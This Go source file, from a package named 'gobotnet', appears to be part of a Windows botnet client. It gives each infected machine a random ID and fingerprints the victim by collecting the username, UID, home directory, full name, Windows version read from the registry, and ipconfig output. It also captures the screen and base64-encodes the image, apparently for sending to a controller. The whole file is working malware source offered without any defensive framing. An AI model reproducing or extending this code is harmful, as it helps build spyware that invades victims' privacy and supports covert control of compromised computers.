package gobotnet

import (
	"bytes"
	"encoding/base64"
	"github.com/satori/go.uuid"
	"github.com/vova616/screenshot"
	"golang.org/x/sys/windows/registry"
	"image"
	"image/png"
	"os/user"
)

var (
	id uuid.UUID = uuid.NewV4()
)

func CmdTest() {
	OutMessage("COMMAND TEST START")
	OutMessage(GetName())
	OutMessage(GetOS())
	OutMessage(GetUid())
	OutMessage(GetUsername())
	OutMessage(GetHomeDir())
	OutMessage(GetIdentificator())
	OutMessage("COMMAND TEST END")
}

func GetIdentificator() string {
	ipConfigOut, _ := CmdExec("ipconfig")
	return id.String() + GetUsername() + string(ipConfigOut)
}

func GetUid() string {
	usr, _ := user.Current()
	return usr.Uid
}

func GetHomeDir() string {
	usr, _ := user.Current()
	return usr.HomeDir
}

func GetName() string {
	usr, _ := user.Current()
	return usr.Name
}

func GetUsername() string {
	usr, _ := user.Current()
	return usr.Username
}

func GetOS() string {
	value, err := GetRegistryKeyValue(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
	if CheckError(err) {
		return ""
	}
	return value
}

func GetScreenshot() (*image.RGBA, error) {
	img, err := screenshot.CaptureScreen()
	CheckError(err)
	return img, err
}

func ImageToBytes(image *image.RGBA) ([]byte, error) {
	buf := new(bytes.Buffer)
	err := png.Encode(buf, image)
	imageBytes := buf.Bytes()
	return imageBytes, err
}

func ToBase64(bytes []byte) string {
	return base64.StdEncoding.EncodeToString(bytes)
}

func FromBase64(str string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(str)
}
